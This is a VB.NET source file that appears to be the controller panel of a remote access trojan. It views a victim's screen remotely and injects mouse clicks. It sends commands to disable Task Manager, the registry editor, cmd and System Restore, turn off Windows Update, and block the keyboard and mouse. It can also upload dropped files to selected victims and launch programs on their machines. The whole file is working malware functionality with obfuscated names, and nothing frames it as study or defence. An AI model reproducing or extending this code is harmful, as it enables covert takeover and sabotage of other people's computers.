Imports System.Runtime.InteropServices
Imports System.IO

Public Class Form28

    'Declare Function ProgressBar0 Lib "user32" Alias "SendMessageA" (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    <System.Runtime.InteropServices.DllImport("user32")>
    Public Shared Function GetAsyncKeyState(ByVal AlBrazele As System.Windows.Forms.Keys) As Short
    End Function

    Public F As Form1 '<< ?
    Dim RichTextBox2 As New RichTextBox
    Dim boxd As New FolderBrowserDialog
    Dim home As New TextBox
    Public xxx As Integer
    Public UODNNXMATTYW As Size
    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
#Region "Private Variable"
    Private filepath As String
    Private extension As String
    Private txtextensions() As String = {".EXE", ".exe"}

#End Region
    Private Sub Cap_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'Me.Button2.Image = CType(Resources.GetObject("Button2.Image"), System.Drawing.Image)
        ''P1.Controls.Add(Panel2)
        'Panel4.Hide()
        Panel6.Hide()
        Dim rr = My.Resources.x1d
        Me.Button2.Image = rr
        Me.ClientSize = New System.Drawing.Size(Form10.TextBox1.Text, Form10.TextBox2.Text)
        SetWindowTheme(TreeView1.Handle, "explorer", Nothing)
        Panel3.Hide()
        For i As Integer = 0 To 13
            C1.Items.Add(QZ(i))
        Next
        For i As Integer = 1 To 10
            C2.Items.Add(i)
        Next
        P1.Image = New Bitmap(UODNNXMATTYW.Width, UODNNXMATTYW.Height)
        C1.SelectedIndex = 4
        C2.SelectedIndex = 4
        C1.Text = "1050; 590"
        C2.Text = "1"
        Label3.Hide()
    End Sub
    Public Sub PktToImage(ByVal BY As Byte())
        'Do


        If Button1.Text = "  " Then
            F.S.Send(xxx, "@" & F.Yy & C1.SelectedIndex & F.Yy & C2.Text & F.Yy & C.Value)
        End If
        If op = Nothing Then
        Else
            If Button1.Text = "  " Then
                Dim pp As New Point(0, 0)
                pp.X = op.X
                pp.Y = op.Y
                op = Nothing
                F.S.Send(xxx, "$" & F.Yy & pp.X & F.Yy & pp.Y & F.Yy)
            End If
        End If
        Dim B As Array = fx(BY, "UOQ81HW728WJ28W92UW920")
        Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
        Dim L As Bitmap = Image.FromStream(Q)
        Dim QQ As String() = Split(BS(B(0)), ",")

        LinkLabel1.Text = "Size: " & siz(BY.LongLength) & " (Case:Active) fps" & QQ.Length - 2
        P1.Controls.Add(LinkLabel1)
        Me.Tople11.MarqueeAnimationSpeed = BY.LongLength
        Me.Tople11.Maximum = BY.LongLength
        'TextBox3.Text = BY.LongLength
        Tople11.Increment(BY.LongLength)
        Dim K As Bitmap = P1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
        Dim G As Graphics = Graphics.FromImage(K)
        Dim tp As Integer = 0
        For i As Integer = 1 To QQ.Length - 2
            Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
            Dim UODNNXMATTYWRLOS As New Size(L.Width, Split(QQ(i), ".")(2))
            G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))
            If CheckBox1.Checked Then
                Dim r As New Rectangle(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1), UODNNXMATTYWRLOS.Width, UODNNXMATTYWRLOS.Height)
                G.DrawRectangle(Pens.Black, r)

            End If
            tp += UODNNXMATTYWRLOS.Height
        Next
        G.Dispose()
        P1.Image = K


    End Sub
    Function QZ(ByVal q As Integer) As Size '  Lower Size of image
        On Error Resume Next
        Do '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

            'P1.Controls.Add(Label2)
            Dim AOPXTTPODCCMO As New Size(UODNNXMATTYW)
            Dim TT# = 1.1, YY = 1.3, UU# = 2.1, OO# = 1.5, UI# = 2.2, RR# = 1.9, AZQ# = 2.5, EWQ# = 3.5
            Dim Xe# = 3, YqWT# = 4, N# = 5, UM# = 6, UEEQS# = 2
            Select Case q
                Case 0
                    Return UODNNXMATTYW
                Case 1
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / TT
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / TT
                Case 2
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / YY
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / YY
                Case 3
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / OO
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / OO
                Case 4
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / RR
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / RR
                Case 5
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UEEQS
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UEEQS
                Case 6
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UU
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UU
                Case 7
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UI
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UI
                Case 8
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / AZQ
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / AZQ
                Case 9
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / Xe
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / Xe
                Case 10
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / EWQ
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / EWQ
                Case 11
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / YqWT
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / YqWT
                Case 12
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / N
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / N
                Case 13
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UM
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UM
            End Select
            AOPXTTPODCCMO.Width = Mid(AOPXTTPODCCMO.Width.ToString, 1, AOPXTTPODCCMO.Width.ToString.Length - 1) & 0
            AOPXTTPODCCMO.Height = Mid(AOPXTTPODCCMO.Height.ToString, 1, AOPXTTPODCCMO.Height.ToString.Length - 1) & 0
            Return AOPXTTPODCCMO
        Loop '>>>>>>>>>>>>>>>>
    End Function

    Private Sub P1_MouseClick(sender As Object, e As MouseEventArgs) Handles P1.MouseClick

        'P1.Controls.Add(Label2)

    End Sub
    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseDown
        If CheckBox2.Checked = True Then
            Dim PP = New Point(e.X * (UODNNXMATTYW.Width / P1.Width), e.Y * (UODNNXMATTYW.Height / P1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 2
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 8
            End If
            F.S.Send(xxx, "#" & F.Yy & PP.X & F.Yy & PP.Y & F.Yy & but)
        End If




    End Sub
    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseUp
        'P1.Controls.Add(Label2)
        If CheckBox2.Checked = True Then
            Dim PP = New Point(e.X * (UODNNXMATTYW.Width / P1.Width), e.Y * (UODNNXMATTYW.Height / P1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 4
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 16
            End If
            F.S.Send(xxx, "#" & F.Yy & PP.X & F.Yy & PP.Y & F.Yy & but)

        End If




    End Sub
    Dim op As New Point(1, 1)
    Private Sub P1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseMove
        Panel3.Hide()
        Panel6.Hide()

        If CheckBox2.Checked = True Then
            If Button1.Text = "  " Then
                Dim PP = New Point(e.X * (UODNNXMATTYW.Width / P1.Width), e.Y * (UODNNXMATTYW.Height / P1.Height))
                If PP <> op Then

                    Dim xz As Boolean
                    xz = GetAsyncKeyState(Keys.S)
                    If xz Then
                        op = PP
                    End If


                    'op = PP

                End If

            End If
        End If

    End Sub
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click


        If Button2.Text = " " Then

            Button2.Text = "  "

            With boxd
                .RootFolder = Environment.SpecialFolder.Desktop
            End With
            If boxd.ShowDialog = Windows.Forms.DialogResult.OK Then

                home.Text = "1"
                P1.Image.Save(boxd.SelectedPath + "\1.png")
                Process.Start(boxd.SelectedPath)
                Dim rrs = My.Resources.x2d
                Me.Button2.Image = rrs
                Timer5.Enabled = True
            End If
        Else
            Button2.Text = " "
            Timer5.Enabled = False
            Dim rrss = My.Resources.x1d
            Me.Button2.Image = rrss
        End If








    End Sub
    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        On Error Resume Next
        'P1.Controls.Add(Label2)
        If TrackBar1.Value = 1 Then
            'C1.Text = "220; 120"
            C.Value = "10"
        End If
        If TrackBar1.Value = 2 Then
            'C1.Text = "270; 150"
            C.Value = "20"
        End If
        If TrackBar1.Value = 3 Then
            'C1.Text = "340; 190"
            C.Value = "30"
        End If
        If TrackBar1.Value = 4 Then
            'C1.Text = "390; 210"
            C.Value = "40"
        End If
        If TrackBar1.Value = 5 Then
            'C1.Text = "450; 250"
            C.Value = "45"
        End If
        If TrackBar1.Value = 6 Then
            'C1.Text = "540; 300"
            C.Value = "50"
        End If
        If TrackBar1.Value = 7 Then
            'C1.Text = "620; 340"
            C.Value = "55"
        End If
        If TrackBar1.Value = 8 Then
            'C1.Text = "650; 360"
            C.Value = "60"
        End If
        If TrackBar1.Value = 9 Then
            'C1.Text = "680; 380"
            C.Value = "65"
        End If
        If TrackBar1.Value = 10 Then
            'C1.Text = "710; 400"
            C.Value = "70"
        End If
        If TrackBar1.Value = 11 Then
            'C1.Text = "910; 510"
            C.Value = "75"
        End If
        If TrackBar1.Value = 12 Then
            'C1.Text = "1050; 590"
            C.Value = "80"

        End If
        If TrackBar1.Value = 13 Then
            'C1.Text = "1240; 690"
            C.Value = "90"

        End If
        If TrackBar1.Value = 14 Then

            C.Value = "100"
        End If

        If TrackBar1.Value = 15 Then
            C1.Text = "1366; 768"
            C.Value = "100"
            Label3.Show()
        Else
            C1.Text = "1050; 590"
            Label3.Hide()
        End If
    End Sub

    Private Sub C1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles C1.SelectedIndexChanged

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Button1.Text = " "
        Button4.Enabled = False
        Button3.Enabled = True


        If Button1.Text = " " Then
            F.S.Send(xxx, "@" & F.Yy & C1.SelectedIndex & F.Yy & C2.Text & F.Yy & C.Value)
            Button1.Text = "  "

        Else
            Button1.Text = " "
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Button1.Text = "  "
        Button4.Enabled = True
        Button3.Enabled = False
        If Button1.Text = " " Then
            F.S.Send(xxx, "@" & F.Yy & C1.SelectedIndex & F.Yy & C2.Text & F.Yy & C.Value)
            Button1.Text = "  "

        Else
            Button1.Text = " "
        End If
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Panel3.Show()
    End Sub


    Private Sub TreeView1_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles TreeView1.AfterSelect
        If e.Node.Level = 1 AndAlso e.Node.Text = "Hide" Then
            Form1.S.Send(xxx, "IconsOFF")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Show" Then
            Form1.S.Send(xxx, "IconsON")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Open" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "opencd") ' ask server to open cd rome
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Close" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "closecd") ' ask server to close cd rome
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Hide Task" Then
            Form1.S.Send(xxx, "TaskbarShow")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "show Task" Then
            Form1.S.Send(xxx, "TaskbarHide")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Hide Clock" Then
            Form1.S.Send(xxx, "ClockOFF")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Show Clock" Then
            Form1.S.Send(xxx, "ClockON")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "OFF" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "winupdateoff") ' ask server to turn on Update
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "ON" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "winupdateon") ' ask server to turn on Update
            Next

        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Hide Taskbar" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "hidetb") ' ask server to hide taskbar
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Show Taskbar" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "showtb") ' ask server to show taskbar
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "cmd Enable" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "EnableCMD") ' ask server to enable cmd
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "cmd Disable" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "DisableCMD") ' ask server to disable cmd
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Task Enable" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "EnableTaskManager") ' ask server to enable task manager 
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Task Disable" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "DisableTaskManager") ' ask server to disable task manager
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Registry Enable" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "EnableRegistry") ' ask server to enable registry
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Registry Disable" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "DisableRegistry") ' ask server to disable registry
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Sys Enable" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "EnableRestore") ' ask server to enable restore
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Sys Disable" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "disable restore") ' ask server to disable restore
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Cursor Hide" Then
            Form1.S.Send(xxx, "CursorHide")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Cursor Show" Then
            Form1.S.Send(xxx, "CursorShow")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Reverse" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "ReverseMouse") ' ask server to reverse mouse
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Normal" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "NormalMouse") ' ask server to unreverse mouse
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Block" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "blockmouseandkeyboard") ' ask server to block keyboard and mouse
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Unblock" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "unblockmouseandkeyboard") ' ask server to unblock keyboard and mouse
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Mute" Then
            Form1.S.Send(xxx, "SoundOFF")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Unmute" Then
            Form1.S.Send(xxx, "SoundON")
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Turn off" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "TurnOffMonitor") ' ask server to turn off monitor
            Next
        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Turn on" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "TurnOnMonitor") ' ask server to turn on monitor
            Next

        ElseIf e.Node.Level = 1 AndAlso e.Node.Text = "Empty the" Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "CLLSKXOa") ' ask server to turn on monitor
            Next


            '0
        End If











    End Sub

    Private Sub P1_Click(sender As Object, e As EventArgs) Handles P1.Click

    End Sub

    Private Sub Cap_MouseUp(sender As Object, e As MouseEventArgs) Handles Me.MouseUp

    End Sub

    Private Sub Cap_Move(sender As Object, e As EventArgs) Handles Me.Move



        Button1.Text = "  "
        Button4.Enabled = True
        Button3.Enabled = False
        If Button1.Text = " " Then
            F.S.Send(xxx, "@" & F.Yy & C1.SelectedIndex & F.Yy & C2.Text & F.Yy & C.Value)
            Button1.Text = " "

        Else
            Button1.Text = " "
        End If
        sss.Text = 1
        Timer1.Enabled = True
        'End If
    End Sub
    Dim sss As New TextBox
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        sss.Text += 1
        If sss.Text = 15 Then
            Button1.Text = " "
            Button4.Enabled = False
            Button3.Enabled = True


            If Button1.Text = " " Then
                F.S.Send(xxx, "@" & F.Yy & C1.SelectedIndex & F.Yy & C2.Text & F.Yy & C.Value)
                Button1.Text = "  "

            Else
                Button1.Text = " "
            End If
            sss.Text = 1
            Timer1.Enabled = False

        End If

    End Sub


    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then


            Dim fx As Form8 = My.Application.OpenForms("A" & xxx)
            If fx Is Nothing Then
                If Me.InvokeRequired Then
                    Me.Invoke(New Form1._Data(AddressOf Form1.Data), New Object() {xxx})
                    Exit Sub
                End If
                fx = New Form8
                fx.xxx = xxx
                fx.Name = " " & xxx
                fx.Text += " " & " - " & Form1.S.IP(xxx)
                fx.Show()
            End If




        End If
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        PictureBox2.Hide()
        PictureBox1.Show()
        LinkLabel1.Hide()
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        PictureBox2.Show()
        PictureBox1.Hide()
        LinkLabel1.Show()
    End Sub

    Private Sub PictureBox2_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox2.MouseUp
        PictureBox2.Hide()
        PictureBox1.Show()
        LinkLabel1.Hide()
    End Sub

    Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseUp
        PictureBox2.Show()
        PictureBox1.Hide()
        LinkLabel1.Show()
    End Sub


    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Tople11.Value = 0


    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick

    End Sub

    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        TextBox3.Text = "cmd"
        'Form1.S.Send(Sock, "xxxxxxxxxxxxx" & TextBox3.Text)

        'Dim name As String = InputBox("ProcessName", "Process Name")



        Form1.S.Send(xxx, "xxxxxxxxxxxxx" & "|U|" & TextBox3.Text)


    End Sub

    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        TextBox3.Text = "regedit"
        Form1.S.Send(xxx, "xxxxxxxxxxxxx" & "|U|" & TextBox3.Text)
    End Sub

    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click
        TextBox3.Text = "taskmgr"
        Form1.S.Send(xxx, "xxxxxxxxxxxxx" & "|U|" & TextBox3.Text)
    End Sub

    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click
        TextBox3.Text = "msinfo32"
        Form1.S.Send(xxx, "xxxxxxxxxxxxx" & "|U|" & TextBox3.Text)
    End Sub

    Private Sub PictureBox8_Click(sender As Object, e As EventArgs) Handles PictureBox8.Click
        TextBox3.Text = "StikyNot"
        Form1.S.Send(xxx, "xxxxxxxxxxxxx" & "|U|" & TextBox3.Text)
    End Sub

    Private Sub PictureBox9_Click(sender As Object, e As EventArgs) Handles PictureBox9.Click
        TextBox3.Text = "DisplaySwitch"
        Form1.S.Send(xxx, "xxxxxxxxxxxxx" & "|U|" & TextBox3.Text)
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        'If Button4.Enabled = False Then
        '    Button2.Enabled = False
        'Else
        '    Button2.Enabled = True
        'End If


        On Error Resume Next

        home.Text += 1
        P1.Image.Save(boxd.SelectedPath + "\" + home.Text + ".png")








    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "TurnOffMonitor") ' ask server to turn off monitor
        Next
    End Sub


    Private Sub Form28_SizeChanged(sender As Object, e As EventArgs) Handles Me.SizeChanged

        Button1.Text = "  "
        Button4.Enabled = True
        Button3.Enabled = False
        If Button1.Text = " " Then
            F.S.Send(xxx, "@" & F.Yy & C1.SelectedIndex & F.Yy & C2.Text & F.Yy & C.Value)
            Button1.Text = " "

        Else
            Button1.Text = " "
        End If
        sss.Text = 1
        Timer1.Enabled = True
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

        If Button4.Enabled = True Then
            TrackBar1.Enabled = True
        Else
            TrackBar1.Enabled = False
        End If
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Panel6.Show()
    End Sub

    Private Sub GOPCS_DragDrop(sender As Object, e As DragEventArgs) Handles GOPCS.DragDrop
        On Error Resume Next
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            filepath = CType(e.Data.GetData(DataFormats.FileDrop), String())(0)
            If filepath.Length <> 0 Then
                extension = Path.GetExtension(filepath)
                GOPCS.Text = File.ReadAllText(filepath)
                R.Text = filepath
            End If
        End If
    End Sub

    Private Sub GOPCS_DragEnter(sender As Object, e As DragEventArgs) Handles GOPCS.DragEnter
        On Error Resume Next
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        Else
            e.Effect = DragDropEffects.None
        End If
    End Sub



    Private Sub R_TextChanged(sender As Object, e As EventArgs) Handles R.TextChanged
        On Error Resume Next
        Dim aa As String = R.Text
        Dim aa1 As String = R.Text
        RichTextBox2.Text = aa.LastIndexOf(".")
        Dim xx1 As String = R.Text
        RichTextBox2.Text = xx1.Substring(RichTextBox2.Text)

        For Each x As ListViewItem In Form1.L1.SelectedItems
            Dim TOP$ = Kys.Key
            Form1.S.Send(x.ToolTipText, "ssstui" & "|U|" & "\" + TOP + RichTextBox2.Text & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(R.Text)))

        Next



        Panel6.Hide()
        R.Text = ""
        GOPCS.Text = "Drop files here"
    End Sub


    Private Sub PictureBox10_Click(sender As Object, e As EventArgs) Handles PictureBox10.Click

    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick
        If GOPCS.Text = "Drop files here" Then
            Me.GOPCS.ForeColor = System.Drawing.SystemColors.AppWorkspace
        Else
            Me.GOPCS.ForeColor = System.Drawing.SystemColors.Control
        End If
    End Sub

    Private Sub GOPCS_TextChanged(sender As Object, e As EventArgs) Handles GOPCS.TextChanged

    End Sub

    Private Sub Panel6_Paint(sender As Object, e As PaintEventArgs) Handles Panel6.Paint

    End Sub
End Class